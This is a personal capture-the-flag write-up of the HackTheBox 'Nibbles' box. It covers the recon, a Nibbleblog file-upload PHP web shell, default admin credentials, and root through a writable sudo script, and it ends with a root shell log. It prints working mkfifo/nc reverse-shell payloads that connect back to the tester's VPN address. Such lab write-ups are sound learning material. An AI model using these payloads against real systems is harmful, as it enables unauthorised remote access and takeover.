---
tags: [htb, easy, linux, retired]
difficulty: Easy
os: Linux
ip: 10.129.200.170
date: 2026-01-18
status: Rooted ✅
---

# 🎯 Nibbles

## 📋 Box Information

| Property | Value |
|----------|-------|
| **Platform** | HackTheBox |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu) |
| **IP Address** | 10.129.200.170 |
| **My VPN IP** | 10.10.16.25 (tun1) ⚠️ |
| **Date Started** | 15-01-2026 |
| **Date Completed** | 18-01-2026 |
| **Time Spent** | ~3 dagen |

---

## 🎯 Flags

| Flag | Hash |
|------|------|
| **User** | `----------------------` |
| **Root** | `----------------------` |

---

## 🔍 Reconnaissance

### Port Scan
```bash
# Initial scan
nmap -sV -sC 10.129.200.170

# Results:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18
```

### Web Enumeration

**Homepage:**
- Simple "Hello world!" page
- HTML comment: `<!-- /nibbleblog/ directory -->`

**Directory bruteforce:**
```bash
gobuster dir -u http://10.129.200.170 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Found:**
- `/nibbleblog/` - Nibbleblog CMS 4.0.3

---

## 🚪 Initial Access

### Vulnerability: File Upload in My Image Plugin

**CMS:** Nibbleblog 4.0.3
**Vulnerability:** Arbitrary File Upload
**Location:** My Image plugin

### Credentials

**Found:** Default credentials
- Username: `admin`
- Password: `nibbles`

### Exploitation Steps

**1. Created reverse shell:**
```bash
nano shell.php
```
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.25 9443 >/tmp/f"); ?>
```

**2. Started listener:**
```bash
nc -lvnp 9443
```

**3. Uploaded via:**
- Admin Panel → Plugins → My Image → Configure
- Upload `shell.php`
- Ignore warnings ⚠️

**4. Triggered shell:**
```
http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
```

**5. Got shell as `nibbler`** ✅

---

## 🔧 Shell Upgrade
```bash
# Spawn TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Set terminal
export TERM=xterm

# Background (Ctrl+Z)
# Then:
stty raw -echo; fg
# Press Enter 2x
```

---

## 📈 Privilege Escalation

### Enumeration
```bash
cd /home/nibbler
ls -la
# Found: personal.zip, user.txt

cat user.txt  # 🚩 User flag!

unzip personal.zip
cd personal/stuff
ls -la
# Found: monitor.sh (writeable!)
```

### Sudo Privileges
```bash
sudo -l

# Output:
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

### Exploitation

**Method:** Append reverse shell to writeable script
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.25 8443 >/tmp/f' | tee -a monitor.sh
```

**New listener:**
```bash
nc -lvnp 8443
```

**Execute as root:**
```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

**Got root shell!** 🔥
```bash
cat /root/root.txt  # 🚩 Root flag!
```

---

## 🎓 Lessons Learned

### Critical Discovery: VPN Routing 🔴

**Problem:** Had 3 VPN tunnels active simultaneously:
- tun0: 10.10.14.10
- tun1: 10.10.16.25 ✅
- tun2: 10.10.14.13

**Solution:**
```bash
ip route get 10.129.200.170
# Shows which interface is actually used!
```

**Lesson:** Always check routing with `ip route get [TARGET_IP]` before setting up reverse shells!

### Other Lessons

- ✅ Default credentials are common (admin:nibbles)
- ✅ File upload vulnerabilities in plugins
- ✅ Always check sudo privileges with `sudo -l`
- ✅ Writeable scripts with sudo = easy privesc
- ✅ Document VPN IP from the start!

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Directory enumeration |
| netcat | Reverse shell listener |
| Python3 | Shell upgrade |
| Burp Suite | Web traffic analysis (optional) |

---

## 📝 Commands Reference

### VPN Troubleshooting
```bash
ip a                              # All interfaces
ip route get [TARGET_IP]          # Which route is used
ping -c 2 [TARGET_IP]            # Test connectivity
```

### Enumeration
```bash
nmap -sV -sC [IP]                # Service scan
gobuster dir -u [URL] -w [WORDLIST]
curl [URL]                        # Quick web check
```

### Reverse Shells
```bash
nc -lvnp [PORT]                  # Listener
python3 -c 'import pty;pty.spawn("/bin/bash")'  # Upgrade
```

### Privilege Escalation
```bash
sudo -l                          # Check sudo rights
find / -perm -4000 2>/dev/null   # SUID binaries
find / -writable 2>/dev/null     # Writable files
```

---

## 🔗 Related Notes

- [[HTB Getting Started Module]]
- [[Reverse Shell Cheat Sheet]]
- [[Linux Privilege Escalation]]
- [[VPN Troubleshooting]]

---

## 📊 Difficulty Rating

**My Rating:** ⭐⭐⭐ (3/10)

**Breakdown:**
- **Enumeration:** Easy (hint in HTML)
- **Initial Access:** Easy (default creds + known vuln)
- **Privilege Escalation:** Easy (obvious sudo rights)
- **Overall:** Good beginner box!

**Challenge:** VPN troubleshooting added difficulty! 😅

---

## 📸 Screenshots

*[Voeg hier screenshots toe van:]*
- [ ] Nmap scan results
- [ ] Nibbleblog admin panel
- [ ] Shell upload
- [ ] User flag
- [ ] Sudo -l output
- [ ] Root flag

---

## ✅ Checklist

- [x] Port scan completed
- [x] Web enumeration done
- [x] Initial foothold achieved
- [x] User flag captured
- [x] Privilege escalation done
- [x] Root flag captured
- [x] Notes documented
- [ ] Writeup published (when retired)

---

## 💭 Personal Notes

**What went well:**
- Systematic enumeration approach
- Persistent troubleshooting of VPN issues
- Learned `ip route get` command

**What could be improved:**
- Check VPN routing FIRST next time
- Take screenshots during exploitation
- Document commands in real-time

**Next box goals:**
- Complete another Easy box
- Try without walkthrough
- Improve time management

---

*Last updated: 2026-01-18*

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.16.25] from (UNKNOWN) [10.129.200.170] 38202
# ls
monitor.sh
# ls.la
/bin/sh: 2: ls.la: not found
# ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4094 Jan 18 16:19 monitor.sh
# cd/root
/bin/sh: 4: cd/root: not found
# cd root
/bin/sh: 5: cd: can't cd to root
# cd /root
# ls
root.txt
# cat root.txt
-----------------------
# 
